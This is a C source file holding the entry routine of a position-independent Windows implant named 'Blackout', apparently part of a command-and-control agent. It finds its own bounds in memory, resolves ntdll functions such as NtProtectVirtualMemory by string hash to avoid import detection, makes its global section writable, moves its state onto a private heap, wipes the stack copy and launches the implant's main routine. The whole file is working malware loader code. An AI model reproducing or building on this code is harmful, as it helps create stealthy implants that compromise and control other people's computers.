#include <common.h>
#include <constexpr.h>

EXTERN_C FUNC VOID Entry(
    PVOID Param
) {
    INSTANCE Blackout = { 0 };
    PVOID    Heap     = { 0 };
    PVOID    MmAddr   = { 0 };
    SIZE_T   MmSize   = { 0 };
    ULONG    Protect  = { 0 };

    MmZero( &Blackout, sizeof( Blackout ) );

    //
    // get the base address of the current implant in memory and the end.
    // subtract the implant end address with the start address you will
    // get the size of the implant in memory
    //
    Blackout.Base.Buffer  = StRipStart();
    Blackout.Base.Length  = U_PTR( StRipEnd() ) - U_PTR( Blackout.Base.Buffer );
    Blackout.Base.FullLen = ( Blackout.Base.Length + 4096 - 1 ) & ~( 4096 -1 );
    //
    // get the offset and address of our global instance structure
    //
    MmAddr = Blackout.Base.Buffer + InstanceOffset();
    MmSize = sizeof( PVOID );

    Blackout.Base.RxBase = Blackout.Base.Buffer;
    Blackout.Base.RxSize = U_PTR( MmAddr ) - U_PTR( Blackout.Base.RxBase );

    //
    // resolve ntdll!RtlAllocateHeap and ntdll!NtProtectVirtualMemory for
    // updating/patching the Instance in the current memory
    // 
    if ( ( Blackout.Modules.Ntdll = LdrModuleAddr( H_MODULE_NTDLL ) ) ) {
        if ( !( Blackout.Win32.RtlAllocateHeap        = LdrFuncAddr( Blackout.Modules.Ntdll, HASH_STR( "RtlAllocateHeap"        ) ) ) ||
             !( Blackout.Win32.NtProtectVirtualMemory = LdrFuncAddr( Blackout.Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) ) ) ||
             !( Blackout.Win32.RtlCreateHeap          = LdrFuncAddr( Blackout.Modules.Ntdll, HASH_STR( "RtlCreateHeap" ) ) )
        ) {
            return;
        }
    }

    // Create heap for agent
    Blackout.Session.Heap = Blackout.Win32.RtlCreateHeap( HEAP_GROWABLE, NULL, 0, 0, 0, NULL );

    //
    // change the protection of the .global section page to RW
    // to be able to write the allocated instance heap address
    //
    if ( !NT_SUCCESS( Blackout.Win32.NtProtectVirtualMemory(
        NtCurrentProcess(),
        &MmAddr,
        &MmSize,
        PAGE_READWRITE,
        & Protect
    ) ) ) {
        return;
    }

    //
    // assign heap address into the RW memory page
    //
    if ( ! ( C_DEF( MmAddr ) = Blackout.Win32.RtlAllocateHeap( Blackout.Session.Heap, HEAP_ZERO_MEMORY, sizeof( INSTANCE ) ) ) ) {
        return;
    }

    //
    // copy the local instance into the heap,
    // zero out the instance from stack and
    // remove RtRipEnd code/instructions as
    // they are not needed anymore
    //
    MmCopy( C_DEF( MmAddr ), &Blackout, sizeof( INSTANCE ) );
    MmZero( &Blackout, sizeof( INSTANCE ) );
    MmZero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );

    //
    // now execute the implant entrypoint
    //
    BlackoutMain( Param );
}